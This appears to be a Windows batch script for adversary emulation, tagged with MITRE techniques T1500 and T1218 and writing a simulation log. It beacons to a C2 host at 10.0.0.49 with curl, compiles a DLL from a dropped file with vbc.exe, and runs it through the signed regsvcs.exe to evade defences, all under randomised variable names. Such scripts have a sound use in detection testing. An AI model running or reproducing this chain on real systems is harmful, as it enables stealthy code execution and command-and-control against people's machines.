@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8277\98ed64ef
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8277-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=teams.txt
SET njozco=file.txt
SET kkjwr=8277

REM Computed random variables
SET ygmps=%APPDATA%\!ufeybybm!\macula-simulations.log
SET njbwowu=%APPDATA%\!ufeybybm!
SET psvhjl=!WINDIR!\Microsoft.NET\Framework\v4.0.30319\vbc.exe
SET cklwgh=%WINDIR%\System32\regsvcs.exe

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: script_start=!kkjwr!>> "!ygmps!" 2>nul

REM 1. C2 HEARTBEAT
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!ygmps!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_complete=!ERRORLEVEL!>> "!ygmps!" 2>nul

REM 3. Change directory
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!ygmps!" 2>nul
cd /d "!recnn!" >nul 2>&1
SET qpnu=0
IF NOT "!CD!"=="!recnn!" SET qpnu=1
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_complete=!qpnu!>> "!ygmps!" 2>nul

REM 4. Compile DLL with T1500 logging
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!ygmps!" 2>nul
SET zhlfgi=0
"!psvhjl!" /target:library /reference:System.EnterpriseServices.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
IF EXIST "!hpnjatpj!" SET zhlfgi=1
SET xmcb=
IF !zhlfgi!==0 SET xmcb=compile_failed
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!zhlfgi!:!xmcb!>> "!ygmps!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_complete=!zhlfgi!>> "!ygmps!" 2>nul

REM 6. Execute with regsvcs with T1218 logging
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execution_start=!cklwgh!>> "!ygmps!" 2>nul
SET fgbvs=0
IF EXIST "!hpnjatpj!" (
    "!cklwgh!" "!hpnjatpj!" >nul 2>&1
    SET fgbvs=1
)
SET mgbka=
IF !fgbvs!==0 SET mgbka=load_failed
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!fgbvs!:!mgbka!>> "!ygmps!" 2>nul
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execution_complete=!fgbvs!>> "!ygmps!" 2>nul

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: script_end=!kkjwr!>> "!ygmps!" 2>nul
ENDLOCAL